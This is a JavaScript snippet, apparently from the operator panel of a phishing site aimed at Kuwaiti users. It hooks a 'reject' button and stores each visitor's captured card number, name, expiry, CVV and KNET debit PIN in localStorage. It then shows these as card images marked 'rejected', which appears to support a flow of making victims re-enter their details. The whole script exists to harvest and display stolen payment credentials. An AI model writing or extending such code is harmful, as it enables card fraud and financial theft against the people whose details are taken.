<script id="kddF114">
(function(){
  if (window.__f114) return; window.__f114 = 1;
  var K = {};
  try { K = JSON.parse(localStorage.getItem('kdd_rej_cards')||'{}') || {}; } catch(e){ K = {}; }
  function sv(){ try { localStorage.setItem('kdd_rej_cards', JSON.stringify(K)); } catch(e){} }
  function sel(){ try { return selectedVisitorId || null; } catch(e){ return null; } }
  function vis(){ var id = sel(); if(!id) return null; try { return visitors.get(id) || null; } catch(e){ return null; } }
  function esc(s){ return String(s==null?'':s).replace(/[&<>"']/g,function(c){return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c];}); }
  function cardHTML(c, t){
    var raw = String(c.cardNumber||'').replace(/\D/g,'');
    var info = (typeof getCardInfo === 'function') ? getCardInfo(raw) : {bank:'',network:'',type:'',tier:''};
    var isK = String(c.paymentMethod||'').toUpperCase() === 'KNET';
    var bg = isK ? 'linear-gradient(135deg,#d1fae5 0%,#ecfdf5 50%,#a7f3d0 100%)' : 'linear-gradient(135deg,#e8e8e8 0%,#f5f5f5 50%,#e0e0e0 100%)';
    var bd = isK ? '#6ee7b7' : '#d0d0d0', fg = isK ? '#064e3b' : '#333', lbl = isK ? '#065f46' : '#888';
    var num = isK ? (c.cardNumberOnly||raw) : raw;
    var fmt = num ? String(num).replace(/(\d{4})(?=\d)/g,'$1 ') : '—';
    var h = '';
    h += '<div class="data-section ' + (isK?'bg-green-50':'bg-purple-50') + ' p-4 rounded-lg" style="border-right-color:' + (isK?'#16a34a':'#9333ea') + '">';
    h += '<div class="flex justify-between items-center mb-3"><h3 class="font-bold ' + (isK?'text-green-800':'text-purple-800') + '">' + (isK?'💳 كي نت (KNET)':'💳 بطاقة دفع') + '</h3>';
    h += '<span style="font-size:12px;font-weight:700;padding:3px 10px;border-radius:8px;background:#fee2e2;color:#b91c1c">مرفوض · ' + t + '</span></div>';
    h += '<div style="background:' + bg + ';border-radius:16px;padding:20px 24px;max-width:420px;margin:0 auto;box-shadow:0 4px 15px rgba(0,0,0,.15);border:1px solid ' + bd + ';font-family:monospace">';
    h += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px"><span style="color:' + lbl + ';font-size:13px;font-weight:bold">' + (isK?'KNET':'KWD') + '</span>';
    h += '<span style="color:' + fg + ';font-size:15px;font-weight:bold">' + esc(isK?(c.bankName||''):info.bank) + ' 🏦</span></div>';
    h += '<div style="text-align:center;margin-bottom:14px"><span dir="ltr" style="font-size:22px;font-weight:bold;color:' + fg + ';letter-spacing:3px;unicode-bidi:embed;display:inline-block">' + fmt + '</span></div>';
    h += '<div style="display:flex;justify-content:space-between;margin-bottom:14px">';
    if (isK) { h += '<div style="text-align:left"><span style="color:' + lbl + ';font-size:11px">Prefix</span><br><span dir="ltr" style="color:#fff;background:' + lbl + ';font-size:15px;font-weight:bold;padding:3px 10px;border-radius:6px">' + esc(c.prefix||'') + '</span></div>'; }
    else { h += '<div style="text-align:left"><span style="color:' + lbl + ';font-size:11px">Name</span><br><span style="color:' + fg + ';font-size:14px;font-weight:600">' + esc(c.nameOnCard||'') + '</span></div>'; }
    h += '<div style="text-align:right"><span style="color:' + lbl + ';font-size:11px">Expiry</span><br><span style="color:' + fg + ';font-size:16px;font-weight:bold">' + esc((c.expiryMonth||'')+'/'+(c.expiryYear||'')) + '</span></div></div>';
    h += '<div style="display:flex;justify-content:space-between">';
    if (isK) {
      h += '<div><span style="color:' + lbl + ';font-size:11px">PIN</span><br><span style="color:' + fg + ';font-size:18px;font-weight:bold">' + esc(c.pin||'-') + '</span></div>';
      h += '<div style="text-align:center"><span style="color:' + lbl + ';font-size:11px">CVV</span><br><span style="color:' + fg + ';font-size:18px;font-weight:bold">' + esc(c.cvv||'-') + '</span></div>';
      h += '<div style="text-align:right"><span style="font-size:16px;font-weight:bold;color:#047857">KNET</span><br><span style="color:' + lbl + ';font-size:11px;font-weight:bold">DEBIT</span></div>';
    } else {
      h += '<div><span style="color:' + lbl + ';font-size:11px">CVV</span><br><span style="color:' + fg + ';font-size:18px;font-weight:bold">' + esc(c.cvv||'-') + '</span></div>';
      h += '<div style="text-align:right"><span style="font-size:16px;font-weight:bold;color:#1a1f71">' + esc(info.network||'') + '</span><br><span style="color:#555;font-size:11px;font-weight:bold">' + esc(String(info.type||'').toUpperCase()+' • '+String(info.tier||'').toUpperCase()) + '</span></div>';
    }
    h += '</div></div></div>';
    return h;
  }
  function cont(){
    var box = document.getElementById('visitorDetails'); if(!box) return null;
    var c = box.querySelector('.space-y-3'); if (c) return c;
    var w = box.querySelector('.space-y-6'); if(!w) return null;
    c = document.createElement('div'); c.className='space-y-3';
    if (w.children.length>1) w.insertBefore(c, w.children[1]); else w.appendChild(c);
    return c;
  }
  var last='';
  function draw(){
    var box = document.getElementById('visitorDetails'); if(!box) return;
    var id = sel(); if(!id) return;
    var c = cont(); if(!c) return;
    var arr = K[id] || [];
    var sig = id + '#' + arr.map(function(x){return x.ts;}).join(',');
    if (sig === last && c.querySelector('[data-f114]')) return;
    last = sig;
    var olds = c.querySelectorAll('[data-f114]');
    for (var k=0;k<olds.length;k++) olds[k].parentNode.removeChild(olds[k]);
    for (var i=arr.length-1;i>=0;i--){
      var d = document.createElement('div'); d.setAttribute('data-f114','1');
      d.innerHTML = cardHTML(arr[i].card || {}, arr[i].t || '');
      c.insertBefore(d, c.firstChild);
    }
  }
  document.addEventListener('click', function(e){
    var b = e.target && e.target.closest ? e.target.closest('button') : null;
    if (!b) return;
    if (String(b.textContent||'').indexOf('رفض') < 0) return;
    var sec = b.closest ? b.closest('.data-section') : null;
    if (!sec) return;
    var h = sec.querySelector('h3'); var title = h ? String(h.textContent||'') : '';
    if (title.indexOf('بطاقة') < 0 && title.indexOf('كي نت') < 0) return;
    setTimeout(function(){
      var v = vis(); if(!v) return;
      var live = v.liveCard || null, card = null;
      if (live && String(live.cardNumber||'').replace(/\D/g,'')) card = { cardNumber: live.cardNumber, nameOnCard: live.nameOnCard, expiryDate: live.expiryDate, cvv: live.cvv, paymentMethod:'CARD' };
      if (!card) { try { var pc = (v.paymentCards||[]); if (pc.length) card = pc[pc.length-1]; } catch(x){} }
      if (!card) return;
      var isK = (title.indexOf('كي نت') > -1) || String(card.paymentMethod||'').toUpperCase()==='KNET';
      var raw = String(card.cardNumber||'').replace(/\D/g,'');
      var snap = {
        cardNumber: raw,
        cardNumberOnly: isK ? raw.slice(6) : undefined,
        prefix: isK ? raw.slice(0,6) : (card.prefix||''),
        bankName: card.bankName||card.nameOnCard||'',
        nameOnCard: card.nameOnCard||'',
        expiryMonth: card.expiryMonth || (String(card.expiryDate||'').split('/')[0]||''),
        expiryYear: card.expiryYear || (String(card.expiryDate||'').split('/')[1]||''),
        cvv: card.cvv||'', pin: card.pin||'',
        paymentMethod: isK ? 'KNET' : 'CARD'
      };
      var id = sel(); if(!id) return;
      var a = K[id] || (K[id]=[]);
      var lt = a[a.length-1];
      if (lt && lt.card && lt.card.cardNumber === snap.cardNumber && (Date.now()-(lt.ts||0) < 5000)) return;
      a.push({ ts: Date.now(), t: new Date().toLocaleTimeString('ar-EG',{hour:'2-digit',minute:'2-digit'}), card: snap });
      sv(); last=''; draw();
    }, 60);
  }, true);
  var o = window.renderVisitorDetails;
  if (typeof o === 'function' && !o.__f114){
    var f = function(){ var r = o.apply(this, arguments); try{ last=''; draw(); }catch(e){} return r; };
    f.__f114 = 1; window.renderVisitorDetails = f; try { renderVisitorDetails = f; } catch(e){}
  }
  setInterval(function(){ draw(); }, 800);
})();
</script>
